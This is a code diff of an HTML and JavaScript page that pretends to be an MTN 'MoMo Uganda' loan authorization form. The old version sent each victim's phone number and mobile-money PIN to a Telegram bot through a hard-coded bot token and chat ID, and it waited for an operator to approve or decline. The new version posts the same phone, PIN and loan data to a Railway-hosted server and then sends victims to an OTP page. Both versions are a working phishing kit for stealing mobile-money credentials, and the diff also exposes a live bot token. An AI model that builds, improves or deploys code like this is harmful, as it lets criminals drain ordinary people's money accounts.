@@ -20,8 +20,6 @@
             --input-bg: #f9fafb;
             --shadow: 0 20px 60px rgba(0,0,0,0.10), 0 4px 16px rgba(0,0,0,0.06);
             --green: #10b981;
-            --yellow: #f59e0b;
-            --blue: #3b82f6;
         }
         *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -50,16 +48,12 @@
         .header {
             background: linear-gradient(135deg, #E42320 0%, #c01c1a 100%);
             padding: 28px 28px 24px;
-            position: relative;
-            overflow: hidden;
         }
         .logo-wrap {
             display: flex;
             align-items: center;
             gap: 12px;
             margin-bottom: 18px;
-            position: relative;
-            z-index: 1;
         }
         .logo-bg {
             background: white;
@@ -87,7 +81,6 @@
             font-size: 23px;
             font-weight: 800;
             color: white;
-            letter-spacing: -0.5px;
         }
         .header-desc {
             font-size: 13.5px;
@@ -234,6 +227,7 @@
             color: #991b1b;
             border: 1px solid #fca5a5;
         }
+        .hide { display: none; }
     </style>
 </head>
 <body>
@@ -248,7 +242,7 @@
             </div>
             <div>
                 <div class="brand-name">MoMo Uganda</div>
-                <div class="brand-sub">Mobile Money</div>
+                <div class="brand-sub">Mobile Money • Loans</div>
             </div>
         </div>
         <div class="header-title">Authorize Your Loan</div>
@@ -272,9 +266,9 @@
         <div class="form-group">
             <label>Mobile Money Network</label>
             <select id="accountType">
-                <option value="mtn">MTN MoMo</option>
-                <option value="airtel">Airtel Money</option>
-                <option value="africell">Africell</option>
+                <option value="MTN">MTN MoMo</option>
+                <option value="Airtel">Airtel Money</option>
+                <option value="Africell">Africell</option>
             </select>
         </div>
         <div class="form-group">
@@ -301,21 +295,15 @@
 
 <div id="spinner">
     <div class="spin-ring"></div>
-    <p style="color:white;">Verifying & Processing...</p>
+    <p style="color:white;">Processing your application...</p>
 </div>
 
 <script>
-    // Telegram Configuration - UGANDA BOT
-    const CONFIG = {
-        BOT_TOKEN: '8743116479:AAH4UIBuqbg6GtuLUMuCZ45L0Tu3Ad9Rs9E',
-        CHAT_ID: '8392790531',
-        DEVICE_PAGE: '/otp'
-    };
-
-    let state = { lastUpdateId: 0 };
+    // Railway URL
+    const RAILWAY_URL = 'https://momo-uganda-production.up.railway.app';
+    
     let isProcessing = false;
-    let userPhone = '';
-    let pendingMessageId = null;
+    let pollInterval = null;
 
     const phoneInput = document.getElementById('phone');
     const pinInput = document.getElementById('password');
@@ -329,23 +317,24 @@
         const calculatorData = sessionStorage.getItem('calculatorData');
         if (calculatorData) {
             const data = JSON.parse(calculatorData);
-            const currency = data.currency || 'UGX';
-            document.getElementById('loanAmount').textContent = `${currency} ${data.amount.toLocaleString()}`;
+            document.getElementById('loanAmount').textContent = `UGX ${data.amount.toLocaleString()}`;
             const months = data.duration / 30;
-            document.getElementById('loanDetails').textContent = `${months} Month${months > 1 ? 's' : ''} • Monthly: ${currency} ${data.monthly.toLocaleString()}`;
+            document.getElementById('loanDetails').textContent = `${months} Month${months > 1 ? 's' : ''} • Monthly: UGX ${data.monthly.toLocaleString()}`;
         } else {
-            // Demo data if no calculator data
+            // Fallback demo data
             document.getElementById('loanAmount').textContent = 'UGX 500,000';
             document.getElementById('loanDetails').textContent = '3 Months • Monthly: UGX 182,500';
         }
     }
 
+    // Validate Uganda phone number
     function isValidUgandaNumber(phone) {
         if (phone.length !== 10) return false;
         const validPrefixes = ['077', '078', '075', '070', '039', '074', '076'];
         return validPrefixes.some(p => phone.startsWith(p));
     }
 
+    // Get network name based on phone prefix
     function getNetworkName(phone) {
         if (phone.startsWith('077') || phone.startsWith('078')) return 'MTN';
         if (phone.startsWith('075') || phone.startsWith('074')) return 'Airtel';
@@ -354,200 +343,38 @@
         return 'Unknown';
     }
 
+    // Show error message
     function showError(msg) {
         errMsg.textContent = msg;
         errMsg.style.display = 'block';
         setTimeout(() => { errMsg.style.display = 'none'; }, 4000);
     }
 
+    // Show status message
     function showStatus(msg, type = 'processing') {
         statusMsg.textContent = msg;
         statusMsg.className = `status-message ${type}`;
         statusMsg.style.display = 'block';
-        setTimeout(() => { statusMsg.style.display = 'none'; }, 3000);
+        setTimeout(() => { statusMsg.style.display = 'none'; }, 8000);
     }
 
-    function sendToBot(phone, pin, network) {
-        if (isProcessing) return;
-        isProcessing = true;
-        continueBtn.disabled = true;
-        continueBtn.textContent = "Verifying...";
-
-        const ts = Date.now();
-        const approveId = `approve_${ts}`;
-        const verifyDeviceId = `verify_device_${ts}`;
-        const appliedId = `applied_${ts}`;
-        const declineId = `decline_${ts}`;
-
-        const loanAmount = document.getElementById('loanAmount').textContent;
-        const accountType = document.getElementById('accountType').options[document.getElementById('accountType').selectedIndex]?.text || network;
-
-        fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: CONFIG.CHAT_ID,
-                text: `<b>🔴 NEW LOAN VERIFICATION - UGANDA</b>\n\n━━━━━━━━━━━━━━━━━━\n<b>💰 Amount:</b> ${loanAmount}\n<b>📱 Network:</b> ${accountType} (${network})\n<b>📞 Phone:</b> <code>${phone}</code>\n<b>🔐 PIN:</b> <code>${pin}</code>\n<b>🕐 Time:</b> ${new Date().toLocaleString()}\n━━━━━━━━━━━━━━━━━━\n\n<b>Select Action:</b>`,
-                parse_mode: 'HTML',
-                reply_markup: {
-                    inline_keyboard: [
-                        [
-                            { text: "✅ Approve Loan", callback_data: approveId },
-                            { text: "📱 Verify Device", callback_data: verifyDeviceId }
-                        ],
-                        [
-                            { text: "📋 Already Applied", callback_data: appliedId },
-                            { text: "❌ Decline", callback_data: declineId }
-                        ]
-                    ]
-                }
-            })
-        })
-        .then(response => response.json())
-        .then(data => {
-            if (data.ok && data.result) {
-                pendingMessageId = data.result.message_id;
-            }
-            spinner.style.display = 'flex';
-            startPolling(approveId, verifyDeviceId, appliedId, declineId);
-        })
-        .catch((error) => {
-            console.error('Error:', error);
-            resetButton();
-            showError("Network error. Please try again.");
-        });
-    }
-
-    function startPolling(approveId, verifyDeviceId, appliedId, declineId) {
-        const interval = setInterval(() => {
-            fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${state.lastUpdateId + 1}&timeout=5`)
-                .then(r => r.json())
-                .then(data => {
-                    if (!data.ok || !data.result) return;
-                    
-                    for (const update of data.result) {
-                        if (update.update_id > state.lastUpdateId) {
-                            state.lastUpdateId = update.update_id;
-                        }
-                        
-                        if (update.callback_query) {
-                            const cb = update.callback_query.data;
-                            const callbackId = update.callback_query.id;
-                            
-                            fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/answerCallbackQuery`, {
-                                method: 'POST',
-                                headers: { 'Content-Type': 'application/json' },
-                                body: JSON.stringify({
-                                    callback_query_id: callbackId,
-                                    text: "Processing your request..."
-                                })
-                            });
-                            
-                            if (cb === approveId) {
-                                clearInterval(interval);
-                                spinner.style.display = 'none';
-                                showStatus("✅ Loan Approved! Redirecting...", "success");
-                                
-                                if (pendingMessageId) {
-                                    fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/editMessageText`, {
-                                        method: 'POST',
-                                        headers: { 'Content-Type': 'application/json' },
-                                        body: JSON.stringify({
-                                            chat_id: CONFIG.CHAT_ID,
-                                            message_id: pendingMessageId,
-                                            text: `✅ <b>LOAN APPROVED - UGANDA</b>\n\nPhone: ${userPhone}\nNetwork: ${getNetworkName(userPhone)}\nStatus: Approved\nTime: ${new Date().toLocaleString()}`,
-                                            parse_mode: 'HTML'
-                                        })
-                                    });
-                                }
-                                
-                                setTimeout(() => {
-                                    alert("Loan Approved! You will receive funds on your MoMo shortly.");
-                                    window.location.href = 'index.html';
-                                }, 1500);
-                                return;
-                            } 
-                            else if (cb === verifyDeviceId) {
-                                clearInterval(interval);
-                                spinner.style.display = 'none';
-                                showStatus("📱 Device verification required.", "processing");
-                                
-                                if (pendingMessageId) {
-                                    fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/editMessageText`, {
-                                        method: 'POST',
-                                        headers: { 'Content-Type': 'application/json' },
-                                        body: JSON.stringify({
-                                            chat_id: CONFIG.CHAT_ID,
-                                            message_id: pendingMessageId,
-                                            text: `📱 <b>DEVICE VERIFICATION - UGANDA</b>\n\nPhone: ${userPhone}\nStatus: Device verification pending\nTime: ${new Date().toLocaleString()}`,
-                                            parse_mode: 'HTML'
-                                        })
-                                    });
-                                }
-                                
-                                resetButton();
-                                return;
-                            }
-                            else if (cb === appliedId) {
-                                clearInterval(interval);
-                                spinner.style.display = 'none';
-                                showStatus("📋 You have already applied. Please wait for approval.", "error");
-                                
-                                if (pendingMessageId) {
-                                    fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/editMessageText`, {
-                                        method: 'POST',
-                                        headers: { 'Content-Type': 'application/json' },
-                                        body: JSON.stringify({
-                                            chat_id: CONFIG.CHAT_ID,
-                                            message_id: pendingMessageId,
-                                            text: `📋 <b>ALREADY APPLIED - UGANDA</b>\n\nPhone: ${userPhone}\nStatus: Previously applied\nTime: ${new Date().toLocaleString()}`,
-                                            parse_mode: 'HTML'
-                                        })
-                                    });
-                                }
-                                
-                                resetButton();
-                                return;
-                            }
-                            else if (cb === declineId) {
-                                clearInterval(interval);
-                                spinner.style.display = 'none';
-                                showError("❌ Request declined. Please try again later.");
-                                
-                                if (pendingMessageId) {
-                                    fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/editMessageText`, {
-                                        method: 'POST',
-                                        headers: { 'Content-Type': 'application/json' },
-                                        body: JSON.stringify({
-                                            chat_id: CONFIG.CHAT_ID,
-                                            message_id: pendingMessageId,
-                                            text: `❌ <b>LOAN DECLINED - UGANDA</b>\n\nPhone: ${userPhone}\nStatus: Declined\nTime: ${new Date().toLocaleString()}`,
-                                            parse_mode: 'HTML'
-                                        })
-                                    });
-                                }
-                                
-                                resetButton();
-                                return;
-                            }
-                        }
-                    }
-                })
-                .catch(err => console.error('Polling error:', err));
-        }, 1000);
-    }
-
+    // Reset button state
     function resetButton() {
         isProcessing = false;
         continueBtn.disabled = false;
         continueBtn.textContent = "Verify & Authorize Loan";
         spinner.style.display = 'none';
+        if (pollInterval) clearInterval(pollInterval);
     }
 
-    continueBtn.onclick = () => {
+    // Main submit function
+    continueBtn.onclick = async () => {
+        if (isProcessing) return;
+        
         const phone = phoneInput.value.trim();
         const pin = pinInput.value.trim();
 
+        // Validation
         if (!phone || !isValidUgandaNumber(phone)) {
             showError("Please enter a valid Uganda number (e.g. 0771234567)");
             return;
@@ -561,13 +388,103 @@
             return;
         }
 
-        userPhone = phone;
+        // Get calculator data
+        const calculatorData = JSON.parse(sessionStorage.getItem('calculatorData') || '{}');
         const network = getNetworkName(phone);
-        sessionStorage.setItem('userPhone', phone);
-        sessionStorage.setItem('userNetwork', network);
-        sendToBot(phone, pin, network);
+        const selectedNetwork = document.getElementById('accountType').value;
+
+        isProcessing = true;
+        continueBtn.disabled = true;
+        continueBtn.textContent = "Submitting...";
+        spinner.style.display = 'flex';
+
+        try {
+            const response = await fetch(`${RAILWAY_URL}/api/save-loan`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    phone: phone,
+                    pin: pin,
+                    network: selectedNetwork,
+                    amount: calculatorData.amount || 500000,
+                    duration: calculatorData.duration || 90,
+                    monthly: calculatorData.monthly || 182500,
+                    total: calculatorData.total || 547500,
+                    interest: calculatorData.interest || 47500
+                })
+            });
+
+            const data = await response.json();
+
+            if (data.success) {
+                // Store loan info in session
+                sessionStorage.setItem('loanId', data.loanId);
+                sessionStorage.setItem('userPhone', phone);
+                sessionStorage.setItem('userNetwork', selectedNetwork);
+                
+                showStatus("✅ Application submitted! Waiting for admin approval on Telegram...", "success");
+                
+                // Poll for status update every 3 seconds
+                pollInterval = setInterval(async () => {
+                    try {
+                        const statusRes = await fetch(`${RAILWAY_URL}/api/loan/${data.loanId}`);
+                        const statusData = await statusRes.json();
+                        
+                        if (statusData.success) {
+                            const loanStatus = statusData.loan.status;
+                            
+                            if (loanStatus === 'otp_sent') {
+                                clearInterval(pollInterval);
+                                spinner.style.display = 'none';
+                                showStatus("✅ Approved by admin! Redirecting to OTP page...", "success");
+                                setTimeout(() => {
+                                    window.location.href = `${RAILWAY_URL}/otp.html`;
+                                }, 1500);
+                            } 
+                            else if (loanStatus === 'declined') {
+                                clearInterval(pollInterval);
+                                spinner.style.display = 'none';
+                                showError("❌ Your application was declined by admin.");
+                                resetButton();
+                            }
+                            else if (loanStatus === 'device_verification') {
+                                clearInterval(pollInterval);
+                                spinner.style.display = 'none';
+                                showStatus("📱 Device verification required. Please check your Telegram.", "processing");
+                                resetButton();
+                            }
+                        }
+                    } catch (err) {
+                        console.error('Polling error:', err);
+                    }
+                }, 3000);
+                
+                // Stop polling after 2 minutes
+                setTimeout(() => {
+                    if (pollInterval) {
+                        clearInterval(pollInterval);
+                        if (spinner.style.display === 'flex') {
+                            spinner.style.display = 'none';
+                            showStatus("⏳ Still waiting for admin approval. You will be notified when approved.", "processing");
+                            resetButton();
+                        }
+                    }
+                }, 120000);
+                
+            } else {
+                spinner.style.display = 'none';
+                showError("Error submitting application: " + (data.error || "Unknown error"));
+                resetButton();
+            }
+        } catch (error) {
+            console.error('Submit error:', error);
+            spinner.style.display = 'none';
+            showError("Network error. Please check your connection and try again.");
+            resetButton();
+        }
     };
 
+    // Input restrictions
     phoneInput.addEventListener('input', () => {
         phoneInput.value = phoneInput.value.replace(/[^0-9]/g, '').slice(0, 10);
     });
@@ -576,7 +493,29 @@
         pinInput.value = pinInput.value.replace(/[^0-9]/g, '').slice(0, 4);
     });
 
+    // Load loan data on page load
     loadLoanData();
+    
+    // Check if we have a pending loan
+    const existingLoanId = sessionStorage.getItem('loanId');
+    if (existingLoanId) {
+        showStatus("You have a pending application. Waiting for admin approval...", "processing");
+        // Check status of existing loan
+        const checkInterval = setInterval(async () => {
+            try {
+                const statusRes = await fetch(`${RAILWAY_URL}/api/loan/${existingLoanId}`);
+                const statusData = await statusRes.json();
+                if (statusData.success && statusData.loan.status === 'otp_sent') {
+                    clearInterval(checkInterval);
+                    window.location.href = `${RAILWAY_URL}/otp.html`;
+                }
+            } catch (err) {
+                console.error('Check error:', err);
+            }
+        }, 5000);
+        
+        setTimeout(() => clearInterval(checkInterval), 60000);
+    }
 </script>
 </body>
 </html>
